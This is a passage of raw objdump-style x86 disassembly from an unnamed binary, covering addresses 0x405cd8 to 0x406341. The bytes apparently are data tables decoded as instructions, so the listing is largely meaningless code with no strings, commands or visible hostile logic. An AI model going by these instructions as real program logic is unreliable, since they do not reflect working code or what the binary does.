  405cd8:	26 05 0a 00 78 0e    	es add $0xe78000a,%eax
  405cde:	5c                   	pop    %esp
  405cdf:	1e                   	push   %ds
  405ce0:	06                   	push   %es
  405ce1:	00 6f 1a             	add    %ch,0x1a(%edi)
  405ce4:	26 05 0a 00 96 0e    	es add $0xe96000a,%eax
  405cea:	5c                   	pop    %esp
  405ceb:	1e                   	push   %ds
  405cec:	06                   	push   %es
  405ced:	00 72 26             	add    %dh,0x26(%edx)
  405cf0:	2b 00                	sub    (%eax),%eax
  405cf2:	16                   	push   %ss
  405cf3:	00 a2 1f d8 0a 06    	add    %ah,0x60ad81f(%edx)
  405cf9:	00 69 16             	add    %ch,0x16(%ecx)
  405cfc:	2b 00                	sub    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 48 0e             	add    %cl,0xe(%eax)
  405d02:	26 05 06 00 f3 17    	es add $0x17f30006,%eax
  405d08:	26 05 06 00 29 0d    	es add $0xd290006,%eax
  405d0e:	26 05 06 00 57 1d    	es add $0x1d570006,%eax
  405d14:	26 05 06 00 65 1a    	es add $0x1a650006,%eax
  405d1a:	26 05 16 00 7e 1a    	es add $0x1a7e0016,%eax
  405d20:	7c 1e                	jl     0x405d40
  405d22:	1a 00                	sbb    (%eax),%al
  405d24:	fd                   	std
  405d25:	1c 45                	sbb    $0x45,%al
  405d27:	22 1a                	and    (%edx),%bl
  405d29:	00 cc                	add    %cl,%ah
  405d2b:	19 45 22             	sbb    %eax,0x22(%ebp)
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	9a 1d 00 00 1a 00 3c 	lcall  $0x3c00,$0x1a00001d
  405d37:	21 45 22             	and    %eax,0x22(%ebp)
  405d3a:	06                   	push   %es
  405d3b:	00 21                	add    %ah,(%ecx)
  405d3d:	1e                   	push   %ds
  405d3e:	58                   	pop    %eax
  405d3f:	18 06                	sbb    %al,(%esi)
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	58                   	pop    %eax
  405d45:	18 06                	sbb    %al,(%esi)
  405d47:	00 4f 18             	add    %cl,0x18(%edi)
  405d4a:	58                   	pop    %eax
  405d4b:	18 06                	sbb    %al,(%esi)
  405d4d:	00 68 00             	add    %ch,0x0(%eax)
  405d50:	58                   	pop    %eax
  405d51:	18 06                	sbb    %al,(%esi)
  405d53:	00 44 1c 17          	add    %al,0x17(%esp,%ebx,1)
  405d57:	26 06                	es push %es
  405d59:	00 93 18 17 26 06    	add    %dl,0x6261718(%ebx)
  405d5f:	00 2f                	add    %ch,(%edi)
  405d61:	0f 58 18             	addps  (%eax),%xmm3
  405d64:	06                   	push   %es
  405d65:	00 fd                	add    %bh,%ch
  405d67:	18 58 18             	sbb    %bl,0x18(%eax)
  405d6a:	1e                   	push   %ds
  405d6b:	00 75 19             	add    %dh,0x19(%ebp)
  405d6e:	0f 20 06             	mov    %cr0,%esi
  405d71:	00 a9 26 f5 16 06    	add    %ch,0x616f526(%ecx)
  405d77:	00 0f                	add    %cl,(%edi)
  405d79:	17                   	pop    %ss
  405d7a:	f5                   	cmc
  405d7b:	16                   	push   %ss
  405d7c:	06                   	push   %es
  405d7d:	00 56 0e             	add    %dl,0xe(%esi)
  405d80:	f5                   	cmc
  405d81:	16                   	push   %ss
  405d82:	06                   	push   %es
  405d83:	00 84 0b 58 18 06 00 	add    %al,0x61858(%ebx,%ecx,1)
  405d8a:	34 0e                	xor    $0xe,%al
  405d8c:	7d 13                	jge    0x405da1
  405d8e:	0a 00                	or     (%eax),%al
  405d90:	16                   	push   %ss
  405d91:	1d 2b 00 0a 00       	sbb    $0xa002b,%eax
  405d96:	cf                   	iret
  405d97:	20 2b                	and    %ch,(%ebx)
  405d99:	00 06                	add    %al,(%esi)
  405d9b:	00 b2 0c 2b 00 43    	add    %dh,0x43002b0c(%edx)
  405da1:	00 d7                	add    %dl,%bh
  405da3:	1d 00 00 12 00       	sbb    $0x120000,%eax
  405da8:	c2 0d f5             	ret    $0xf50d
  405dab:	1b 06                	sbb    (%esi),%eax
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 bd 0a 06 00 14    	add    %bh,0x1400060a(%ebp)
  405db5:	19 58 18             	sbb    %ebx,0x18(%eax)
  405db8:	06                   	push   %es
  405db9:	00 34 26             	add    %dh,(%esi,%eiz,1)
  405dbc:	a0 19 06 00 a5       	mov    0xa5000619,%al
  405dc1:	0f 58 18             	addps  (%eax),%xmm3
  405dc4:	06                   	push   %es
  405dc5:	00 e2                	add    %ah,%dl
  405dc7:	1d 58 18 06 00       	sbb    $0x61858,%eax
  405dcc:	10 0e                	adc    %cl,(%esi)
  405dce:	58                   	pop    %eax
  405dcf:	18 22                	sbb    %ah,(%edx)
  405dd1:	00 8b 1a 9d 1c 22    	add    %cl,0x221c9d1a(%ebx)
  405dd7:	00 78 1f             	add    %bh,0x1f(%eax)
  405dda:	9d                   	popf
  405ddb:	1c 22                	sbb    $0x22,%al
  405ddd:	00 c4                	add    %al,%ah
  405ddf:	1c 9d                	sbb    $0x9d,%al
  405de1:	1c 12                	sbb    $0x12,%al
  405de3:	00 bc 1c b9 1e 22 00 	add    %bh,0x221eb9(%esp,%ebx,1)
  405dea:	90                   	nop
  405deb:	1f                   	pop    %ds
  405dec:	9d                   	popf
  405ded:	1c 06                	sbb    $0x6,%al
  405def:	00 4f 1f             	add    %cl,0x1f(%edi)
  405df2:	17                   	pop    %ss
  405df3:	26 06                	es push %es
  405df5:	00 21                	add    %ah,(%ecx)
  405df7:	1a 58 18             	sbb    0x18(%eax),%bl
  405dfa:	06                   	push   %es
  405dfb:	00 56 1f             	add    %dl,0x1f(%esi)
  405dfe:	17                   	pop    %ss
  405dff:	26 12 00             	adc    %es:(%eax),%al
  405e02:	76 1c                	jbe    0x405e20
  405e04:	17                   	pop    %ss
  405e05:	26 06                	es push %es
  405e07:	00 16                	add    %dl,(%esi)
  405e09:	18 17                	sbb    %dl,(%edi)
  405e0b:	26 06                	es push %es
  405e0d:	00 7f 00             	add    %bh,0x0(%edi)
  405e10:	17                   	pop    %ss
  405e11:	26 06                	es push %es
  405e13:	00 0b                	add    %cl,(%ebx)
  405e15:	1a 58 18             	sbb    0x18(%eax),%bl
  405e18:	06                   	push   %es
  405e19:	00 6c 18 17          	add    %ch,0x17(%eax,%ebx,1)
  405e1d:	26 06                	es push %es
  405e1f:	00 6e 0d             	add    %ch,0xd(%esi)
  405e22:	17                   	pop    %ss
  405e23:	26 06                	es push %es
  405e25:	00 32                	add    %dh,(%edx)
  405e27:	0d 17 26 06 00       	or     $0x62617,%eax
  405e2c:	ad                   	lods   %ds:(%esi),%eax
  405e2d:	18 17                	sbb    %dl,(%edi)
  405e2f:	26 06                	es push %es
  405e31:	00 4d 0d             	add    %cl,0xd(%ebp)
  405e34:	17                   	pop    %ss
  405e35:	26 06                	es push %es
  405e37:	00 f4                	add    %dh,%ah
  405e39:	19 17                	sbb    %edx,(%edi)
  405e3b:	26 06                	es push %es
  405e3d:	00 da                	add    %bl,%dl
  405e3f:	1c 58                	sbb    $0x58,%al
  405e41:	18 06                	sbb    %al,(%esi)
  405e43:	00 cf                	add    %cl,%bh
  405e45:	25 58 18 06 00       	and    $0x61858,%eax
  405e4a:	68 20 b9 1e 06       	push   $0x61eb920
  405e4f:	00 ed                	add    %ch,%ch
  405e51:	0d 58 18 06 00       	or     $0x61858,%eax
  405e56:	44                   	inc    %esp
  405e57:	0b 17                	or     (%edi),%edx
  405e59:	26 06                	es push %es
  405e5b:	00 5f 00             	add    %bl,0x0(%edi)
  405e5e:	58                   	pop    %eax
  405e5f:	18 06                	sbb    %al,(%esi)
  405e61:	00 db                	add    %bl,%bl
  405e63:	0d 58 18 06 00       	or     $0x61858,%eax
  405e68:	41                   	inc    %ecx
  405e69:	0e                   	push   %cs
  405e6a:	58                   	pop    %eax
  405e6b:	18 06                	sbb    %al,(%esi)
  405e6d:	00 87 20 26 05 06    	add    %al,0x6052620(%edi)
  405e73:	00 aa 0f 26 05 0a    	add    %ch,0xa05260f(%edx)
  405e79:	00 23                	add    %ah,(%ebx)
  405e7b:	18 5f 19             	sbb    %bl,0x19(%edi)
  405e7e:	0a 00                	or     (%eax),%al
  405e80:	5e                   	pop    %esi
  405e81:	0d 5f 19 00 00       	or     $0x195f,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	93                   	xchg   %eax,%ebx
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 9a 07 0d 24 05    	add    %bl,0x5240d07(%edx)
  405e9b:	00 01                	add    %al,(%ecx)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 3e    	add    %al,0x3e001001(%ecx)
  405ea5:	09 0d 24 05 00 01    	or     %ecx,0x1000524
  405eab:	00 03                	add    %al,(%ebx)
  405ead:	00 81 01 10 00 38    	add    %al,0x38001001(%ecx)
  405eb3:	0a 74 25 05          	or     0x5(%ebp,%eiz,1),%dh
  405eb7:	00 13                	add    %dl,(%ebx)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 5b 09             	add    %bl,0x9(%ebx)
  405ec2:	1b 0a                	sbb    (%edx),%ecx
  405ec4:	05 00 1e 00 24       	add    $0x24001e00,%eax
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 10                	add    %dl,(%eax)
  405ecd:	00 64 25 8a          	add    %ah,-0x76(%ebp,%eiz,1)
  405ed1:	04 05                	add    $0x5,%al
  405ed3:	00 1e                	add    %bl,(%esi)
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 f9    	add    %al,-0x6ffefff(%ecx)
  405edd:	09 8a 04 05 00 1e    	or     %ecx,0x1e000504(%edx)
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 da                	add    %bl,%dl
  405eeb:	12 8a 04 05 00 1e    	adc    0x1e000504(%edx),%cl
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 c4    	add    %al,-0x3bffefff(%ecx)
  405ef9:	0c 8a                	or     $0x8a,%al
  405efb:	04 05                	add    $0x5,%al
  405efd:	00 1e                	add    %bl,(%esi)
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  405f07:	01 8a 04 05 00 1e    	add    %ecx,0x1e000504(%edx)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 55    	add    %al,0x55001001(%ecx)
  405f15:	02 8a 04 05 00 1f    	add    0x1f000504(%edx),%cl
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 d6                	add    %dl,%dh
  405f23:	23 00                	and    (%eax),%eax
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 54    	add    %al,0x54001001(%ecx)
  405f31:	04 8a                	add    $0x8a,%al
  405f33:	04 05                	add    $0x5,%al
  405f35:	00 23                	add    %ah,(%ebx)
  405f37:	00 3e                	add    %bh,(%esi)
  405f39:	00 81 01 10 00 5c    	add    %al,0x5c001001(%ecx)
  405f3f:	03 8a 04 05 00 23    	add    0x23000504(%edx),%ecx
  405f45:	00 41 00             	add    %al,0x0(%ecx)
  405f48:	81 01 10 00 d2 03    	addl   $0x3d20010,(%ecx)
  405f4e:	e3 23                	jecxz  0x405f73
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 a0    	add    %al,-0x5fffefff(%ebx)
  405f5b:	16                   	push   %ss
  405f5c:	00 00                	add    %al,(%eax)
  405f5e:	05 00 25 00 4b       	add    $0x4b002500,%eax
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 59 07             	add    %bl,0x7(%ecx)
  405f6a:	4d                   	dec    %ebp
  405f6b:	03 05 00 26 00 4b    	add    0x4b002600,%eax
  405f71:	00 81 01 10 00 c6    	add    %al,-0x39ffefff(%ecx)
  405f77:	09 4d 03             	or     %ecx,0x3(%ebp)
  405f7a:	05 00 2d 00 52       	add    $0x52002d00,%eax
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 80 06 00 00 05    	add    %al,0x5000006(%eax)
  405f89:	00 2d 00 54 00 13    	add    %ch,0x13005400
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 1a                	add    %bl,(%edx)
  405f93:	03 00                	add    (%eax),%eax
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 a0 08 57 24 05    	add    %ah,0x5245708(%eax)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 e6                	add    %ah,%dh
  405faf:	01 57 24             	add    %edx,0x24(%edi)
  405fb2:	05 00 2f 00 5f       	add    $0x5f002f00,%eax
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 e1                	add    %ah,%cl
  405fbd:	09 57 24             	or     %edx,0x24(%edi)
  405fc0:	05 00 31 00 63       	add    $0x63003100,%eax
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 1f                	add    %bl,(%edi)
  405fcb:	15 57 24 05 00       	adc    $0x52457,%eax
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	c9                   	leave
  405fd9:	12 57 24             	adc    0x24(%edi),%dl
  405fdc:	39 00                	cmp    %eax,(%eax)
  405fde:	3a 00                	cmp    (%eax),%al
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 b4 24 57 24 05 00 	add    %dh,0x52457(%esp)
  405fec:	47                   	inc    %edi
  405fed:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ff3:	00 85 05 57 24 05    	add    %al,0x5245705(%ebp)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 ee    	add    %al,-0x11ffefff(%ecx)
  406003:	00 57 24             	add    %dl,0x24(%edi)
  406006:	05 00 47 00 a2       	add    $0xa2004700,%eax
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 48 24             	add    %cl,0x24(%eax)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 ed                	add    %ch,%ch
  40601f:	04 00                	add    $0x0,%al
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 e6 17 	add    %ah,0x17e60016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 67 09             	add    %ah,0x9(%edi)
  406032:	12 00                	adc    (%eax),%al
  406034:	16                   	push   %ss
  406035:	00 c3                	add    %al,%bl
  406037:	02 12                	add    (%edx),%dl
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 5c 01 12          	add    %bl,0x12(%ecx,%eax,1)
  40603f:	00 16                	add    %dl,(%esi)
  406041:	00 91 06 12 00 16    	add    %dl,0x16001206(%ecx)
  406047:	00 a0 1b 12 00 16    	add    %ah,0x1600121b(%eax)
  40604d:	00 2d 06 12 00 16    	add    %ch,0x16001206
  406053:	00 9e 02 12 00 16    	add    %bl,0x16001202(%esi)
  406059:	00 51 0a             	add    %dl,0xa(%ecx)
  40605c:	12 00                	adc    (%eax),%al
  40605e:	16                   	push   %ss
  40605f:	00 eb                	add    %ch,%bl
  406061:	08 12                	or     %dl,(%edx)
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 28                	add    %ch,(%eax)
  406067:	0a 15 00 16 00 9b    	or     0x9b001600,%dl
  40606d:	24 12                	and    $0x12,%al
  40606f:	00 16                	add    %dl,(%esi)
  406071:	00 bd 17 19 00 16    	add    %bh,0x16001917(%ebp)
  406077:	00 d3                	add    %dl,%bl
  406079:	00 12                	add    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 95 0d 12 00 16    	add    %dl,0x1600120d(%ebp)
  406083:	00 4a 01             	add    %cl,0x1(%edx)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 c4                	add    %al,%ah
  40608b:	14 12                	adc    $0x12,%al
  40608d:	00 16                	add    %dl,(%esi)
  40608f:	00 7f 23             	add    %bh,0x23(%edi)
  406092:	12 00                	adc    (%eax),%al
  406094:	11 00                	adc    %eax,(%eax)
  406096:	90                   	nop
  406097:	0c 21                	or     $0x21,%al
  406099:	00 11                	add    %dl,(%ecx)
  40609b:	00 75 0c             	add    %dh,0xc(%ebp)
  40609e:	25 00 11 00 45       	and    $0x45001100,%eax
  4060a3:	0c 29                	or     $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 db                	add    %bl,%bl
  4060a9:	0b 2d 00 11 00 5d    	or     0x5d001100,%ebp
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 c0                	add    %al,%al
  4060b5:	0b 30                	or     (%eax),%esi
  4060b7:	00 11                	add    %dl,(%ecx)
  4060b9:	00 a3 0b 34 00 31    	add    %ah,0x3100340b(%ebx)
  4060bf:	00 89 0b 37 00 11    	add    %cl,0x1100370b(%ecx)
  4060c5:	00 f7                	add    %dh,%bh
  4060c7:	0b 30                	or     (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 2b                	add    %ch,(%ebx)
  4060cd:	0c 3a                	or     $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 0d 0c 34 00 16    	add    %cl,0x1600340c
  4060d7:	00 70 04             	add    %dh,0x4(%eax)
  4060da:	dc 00                	faddl  (%eax)
  4060dc:	06                   	push   %es
  4060dd:	06                   	push   %es
  4060de:	b0 09                	mov    $0x9,%al
  4060e0:	06                   	push   %es
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	98                   	cwtl
  4060e5:	23 09                	and    (%ecx),%ecx
  4060e7:	01 56 80             	add    %edx,-0x80(%esi)
  4060ea:	aa                   	stos   %al,%es:(%edi)
  4060eb:	14 09                	adc    $0x9,%al
  4060ed:	01 56 80             	add    %edx,-0x80(%esi)
  4060f0:	93                   	xchg   %eax,%ebx
  4060f1:	25 09 01 31 00       	and    $0x310109,%eax
  4060f6:	d2 04 12             	rolb   %cl,(%edx,%edx,1)
  4060f9:	00 16                	add    %dl,(%esi)
  4060fb:	00 7d 1d             	add    %bh,0x1d(%ebp)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 9a 04 43 01 51    	add    %bl,0x51014304(%edx)
  406107:	80 f5 02             	xor    $0x2,%ch
  40610a:	3a 00                	cmp    (%eax),%al
  40610c:	51                   	push   %ecx
  40610d:	80 73 07 3a          	xorb   $0x3a,0x7(%ebx)
  406111:	00 51 80             	add    %dl,-0x80(%ecx)
  406114:	a0 17 3a 00 51       	mov    0x51003a17,%al
  406119:	80 3b 24             	cmpb   $0x24,(%ebx)
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	48                   	dec    %eax
  406121:	02 29                	add    (%ecx),%ch
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 a7 24 29 00 31    	add    %ah,0x31002924(%edi)
  40612b:	00 8f 09 29 00 33    	add    %cl,0x33002909(%edi)
  406131:	01 79 15             	add    %edi,0x15(%ecx)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	86 15 8f 01 01 00    	xchg   %dl,0x1018f
  40613e:	6b 02 30             	imul   $0x30,(%edx),%eax
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 bd 05 3a 00 01    	add    %bh,0x1003a05(%ebp)
  406149:	00 6b 02             	add    %ch,0x2(%ebx)
  40614c:	30 01                	xor    %al,(%ecx)
  40614e:	01 00                	add    %eax,(%eax)
  406150:	68 08 c7 01 01       	push   $0x101c708
  406155:	00 21                	add    %ah,(%ecx)
  406157:	01 12                	add    %edx,(%edx)
  406159:	00 01                	add    %al,(%ecx)
  40615b:	00 c4                	add    %al,%ah
  40615d:	03 12                	add    (%edx),%edx
  40615f:	00 01                	add    %al,(%ecx)
  406161:	00 f9                	add    %bh,%cl
  406163:	07                   	pop    %es
  406164:	37                   	aaa
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 b6 0d 02 02 01    	add    %dh,0x102020d(%esi)
  40616d:	00 b4 23 c7 01 01 00 	add    %dh,0x101c7(%ebx,%eiz,1)
  406174:	6b 02 30             	imul   $0x30,(%edx),%eax
  406177:	01 01                	add    %eax,(%ecx)
  406179:	00 4e 08             	add    %cl,0x8(%esi)
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	b0 09                	mov    $0x9,%al
  406182:	3a 00                	cmp    (%eax),%al
  406184:	56                   	push   %esi
  406185:	80 01 1c             	addb   $0x1c,(%ecx)
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 f7 08             	xor    $0x8,%bh
  40618e:	02 02                	add    (%edx),%al
  406190:	56                   	push   %esi
  406191:	80 94 17 02 02 56 80 	adcb   $0x8,-0x7fa9fdfe(%edi,%edx,1)
  406198:	08 
  406199:	01 02                	add    %eax,(%edx)
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	c7                   	(bad)
  40619f:	26 02 02             	add    %es:(%edx),%al
  4061a2:	56                   	push   %esi
  4061a3:	80 13 09             	adcb   $0x9,(%ebx)
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 69 03 02          	subb   $0x2,0x3(%ecx)
  4061ad:	02 56 80             	add    -0x80(%esi),%dl
  4061b0:	5c                   	pop    %esp
  4061b1:	08 02                	or     %al,(%edx)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	c3                   	ret
  4061b7:	18 02                	sbb    %al,(%edx)
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	c6                   	(bad)
  4061bd:	23 02                	and    (%edx),%eax
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	0d 07 02 02 56       	or     $0x56020207,%eax
  4061c7:	80 12 02             	adcb   $0x2,(%edx)
  4061ca:	02 02                	add    (%edx),%al
  4061cc:	33 01                	xor    (%ecx),%eax
  4061ce:	af                   	scas   %es:(%edi),%eax
  4061cf:	05 fd 02 08 26       	add    $0x260802fd,%eax
  4061d4:	00 00                	add    %al,(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 05 19 0a 00 01    	add    %al,0x1000a19
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	ec                   	in     (%dx),%al
  4061e9:	1d 0e 00 01 00       	sbb    $0x1000e,%eax
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 a9 06 1d 00 01    	add    %ch,0x1001d06(%ecx)
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 aa 03 1d 00 01    	add    %ch,0x1001d03(%edx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 f2 1d 0a    	add    %dl,0xa1df218(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 14 22 3d    	add    %dl,0x3d221408(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 22 22 42    	add    %dl,0x42222208(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 f8 21 48    	add    %dl,0x4821f808(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 06 22 4d    	add    %dl,0x4d220608(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 cb 1c 53    	add    %dl,0x531ccb08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 d6 1c 58    	add    %dl,0x581cd608(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 31 12 5e    	add    %dl,0x5e123108(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 40 12             	or     %al,0x12(%eax)
  406284:	62 00                	bound  %eax,(%eax)
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 a3 21 5e    	add    %dl,0x5e21a308(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 ae 21 62    	add    %dl,0x6221ae08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 f2 11 67    	add    %dl,0x6711f208(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 00 12 6c    	add    %dl,0x6c120008(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 60 0b 1d    	add    %dl,0x1d0b6008(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 70 0b 72    	add    %dl,0x720b7008(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 ee 0a 77    	add    %dl,0x770aee08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 6b 13 67    	add    %dl,0x67136b08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 74 13 6c    	add    %dl,0x6c137408(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 20 17 7b    	add    %dl,0x7b172008(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 2d 17 7f    	add    %dl,0x7f172d08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 5f 14 1d    	add    %dl,0x1d145f08(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 70 14 72    	add    %dl,0x72147008(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
